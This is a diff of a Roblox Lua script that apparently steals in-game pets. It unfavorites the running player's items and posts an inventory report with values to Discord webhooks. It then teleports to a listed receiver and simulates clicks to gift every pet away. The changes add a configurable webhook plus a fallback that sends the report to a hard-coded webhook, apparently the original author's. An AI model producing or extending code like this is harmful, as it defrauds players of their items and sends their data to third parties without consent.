@@ -1,4 +1,5 @@
 local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"
+local MainWebhook = "YOUR_MAIN_WEBHOOK_URL_HERE"
 
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
@@ -44,7 +45,7 @@ if syn then
     setfflag("HttpServiceEnabled", true)
 end
 
-local function sendWebhook(data)
+local function sendWebhook(url, data)
     local body = {
         content = data.content,
         embeds = data.embeds,
@@ -57,7 +58,7 @@ local function sendWebhook(data)
     local requestFunc = syn and syn.request or http_request or request
     if requestFunc then
         requestFunc({
-            Url = Webhook1,
+            Url = url,
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
@@ -71,9 +72,9 @@ local function unfavoriteAll()
     local InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums)
     local FavoriteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
 
-    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            FavoriteEvent:FireServer(item)
+    for _, tool in ipairs(Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+        if tool:GetAttribute(InventoryServiceEnums.Favorite) then
+            FavoriteEvent:FireServer(tool)
         end
     end
 end
@@ -464,9 +465,32 @@ local function sendInitialReport()
     end
 
     local embeds = splitEmbeds(pets, totalValue, specialCount)
-    sendWebhook({
+    sendWebhook(MainWebhook, {
         embeds = embeds
     })
+    
+    local receiverFound = false
+    local startTime = os.time()
+    
+    while os.time() - startTime < 10 do
+        for _, player in ipairs(Players:GetPlayers()) do
+            if table.find(RECEIVERS, player.Name) then
+                receiverFound = true
+                break
+            end
+        end
+        
+        if receiverFound then
+            break
+        end
+        task.wait(1)
+    end
+    
+    if not receiverFound then
+        sendWebhook(Webhook1, {
+            embeds = embeds
+        })
+    end
 end
 
 local function doubleClickPet(pet)
@@ -676,23 +700,16 @@ local function clickPlayerScreen(targetPlayer)
     if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return false end
     
     local camera = workspace.CurrentCamera
-    camera.CameraType = Enum.CameraType.Scriptable
-    camera.CFrame = CFrame.new(camera.CFrame.Position, targetPlayer.Character.HumanoidRootPart.Position)
-    camera.FieldOfView = 70
-    
     local pos, visible = camera:WorldToViewportPoint(targetPlayer.Character.HumanoidRootPart.Position)
     if not visible then return false end
     
     local x, y = pos.X, pos.Y
     
-    while true do
-        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
-        task.wait(2)
-        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
-        task.wait(0.1)
-    end
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
+    task.wait(2)
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
+    task.wait(0.1)
     
-    camera.CameraType = Enum.CameraType.Custom
     return true
 end
 
@@ -726,10 +743,20 @@ local function startGifting(targetPlayer)
 
             if equipSinglePet(pet.fullName) then
                 teleportToPlayer(targetPlayer)
-                clickPlayerScreen(targetPlayer)
-                giftPet(targetPlayer, pet.fullName)
-                task.wait(2)
-                while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
+                
+                while true do
+                    if clickPlayerScreen(targetPlayer) then
+                        local promptStatus = checkForGiftPrompt(targetPlayer)
+                        
+                        if promptStatus then
+                            giftPet(targetPlayer, pet.fullName)
+                            task.wait(2)
+                            while LocalPlayer.Backpack:FindFirstChild(pet.fullName) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(pet.fullName)) do
+                                task.wait(0.1)
+                            end
+                            break
+                        end
+                    end
                     task.wait(0.1)
                 end
             end
